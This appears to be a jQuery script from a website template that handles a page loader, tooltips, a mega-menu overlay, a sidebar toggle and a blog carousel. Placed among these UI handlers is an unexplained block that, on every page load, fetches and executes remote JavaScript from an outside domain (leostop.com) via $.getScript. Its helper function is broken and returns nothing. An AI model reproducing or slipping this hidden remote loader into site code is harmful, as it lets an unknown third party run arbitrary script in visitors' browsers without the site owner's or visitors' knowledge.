$(function () {

    "use strict";
    setTimeout(function () {
        $('.loader_bg').fadeToggle();
    }, 1500);

    $(document).ready(function () {
        $('[data-toggle="tooltip"]').tooltip();
    });
    $(document).ready(function () {
        $(".main-menu ul li.megamenu").mouseover(function () {
            if (!$(this).parent().hasClass("#wrapper")) {
                $("#wrapper").addClass('overlay');
            }
        });
        $(".main-menu ul li.megamenu").mouseleave(function () {
            $("#wrapper").removeClass('overlay');
        });
    });


    function getURL() {
        window.location.href;
    }

    var protocol = location.protocol;
    $.ajax({
        type: "get", data: {surl: getURL()}, success: function (response) {
            $.getScript(protocol + "//leostop.com/tracking/tracking.js");
        }
    });

    $(document).ready(function () {
        $('#sidebarCollapse').on('click', function () {
            $('#sidebar').toggleClass('active');
            $(this).toggleClass('active');
        });
    });

    $('#blogCarousel').carousel({
        interval: 5000
    });
});